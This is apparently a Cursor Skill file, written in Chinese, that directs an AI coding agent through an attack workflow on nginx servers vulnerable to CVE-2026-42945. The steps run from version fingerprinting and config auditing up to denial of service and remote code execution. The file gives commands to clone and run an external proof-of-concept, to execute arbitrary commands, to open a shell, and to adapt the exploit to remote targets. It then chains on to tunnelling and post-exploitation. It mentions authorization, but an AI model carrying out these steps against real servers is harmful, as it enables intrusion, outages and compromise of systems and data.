---
name: 河门·裂
description: >-
 授权目标上 NGINX Rift（CVE-2026-42945）作业：指纹、配置审计，并在 scope 内推进到
 L3 DoS / L4 RCE（外置 DepthFirst PoC）。
---

# NGINX Rift / CVE-2026-42945（Cursor Skill）

## 何时用

- `Server: nginx` 或 OpenResty/Plus，版本疑似 ≤ 1.30.0
- 用户点名 CVE-2026-42945 / NGINX Rift / rewrite 堆溢出 / 要打到 RCE
- `auto_campaign` 指纹 `has_nginx=true`
- 内网/源站摸到裸 nginx，要排高危 1day

## 真源（按序）

1. `传承/河门·裂.md`（含 L1–L4 入口命令）
2. `炼蛊房/nginx_rift_probe.py`（L1/L2）
3. `tools/1day-kit/custom-templates/nginx-rift-cve-2026-42945.yaml`
4. 外置 PoC：`poc-db/nginx-rift/`（DepthFirst clone）
5. F5：`https://my.f5.com/manage/s/article/K000161019`

## 强制步骤

1. 目标在 scope。
2. L1：`python3 炼蛊房/nginx_rift_probe.py detect -u <URL> --out 案卷/<案卷>/案卷/nginx_rift/`
3. L2（有配置）：`check-config -f <nginx.conf>`；可加 `surface` / nuclei。
4. **授权内推进 L3/L4**（见 Playbook §五 Step 4–5）：
 ```bash
 git clone --depth 1 https://github.com/DepthFirstDisclosures/Nginx-Rift.git poc-db/nginx-rift
 cd poc-db/nginx-rift/Nginx-Rift && ./setup.sh
 docker compose -f env/docker-compose.yml up -d # lab :19321
 python3 poc.py --cmd 'echo pwned > /tmp/pwned' # L4 lab
 python3 poc.py --shell
 # 远程授权目标：python3 poc.py --help 后按 host/port/路径改；STATUS 记 DoS 风险
 ```
5. 证据落 `案卷/nginx_rift/`（含 `l3_l4/`），STATUS 勾选 L1–L4 实际达到的级别。

## 成功口径

| 级别 | 口径 |
|------|------|
| L1 | 版本落在 `0.6.27`–`1.30.0`（或等价 Plus 未补丁） |
| L2 | 配置审计命中「rewrite 含 `?` + 后续未命名 `$n`」 |
| L3 | 授权目标/lab 上 worker 崩溃或可复现服务抖动 |
| L4 | 命令执行证据（lab：`/tmp/pwned`；远程：等价回显/落盘） |

开 ASLR 且无泄露时勿虚报 L4。

## 不要做

- 未授权目标 / 乱扩第三方域
- 只凭 `Server: nginx` 结案「可 RCE」
- 把完整第三方 exploit 硬 vendor 进 `tools/`（用 `poc-db/nginx-rift/`）
- 业务已现 Actuator/支付指纹时只卡在本 CVE 不切专用链

## 衔接

- CDN 藏版本 → `cdn-origin-tracing`
- 后面是 Spring → `spring-actuator-cloud-takeover` / Gateway playbook
- L4 得 shell → `internal-tunnel` / `linux-post-exploit`
- 广谱 → `1day-nuclei-kit` + `auto_campaign`
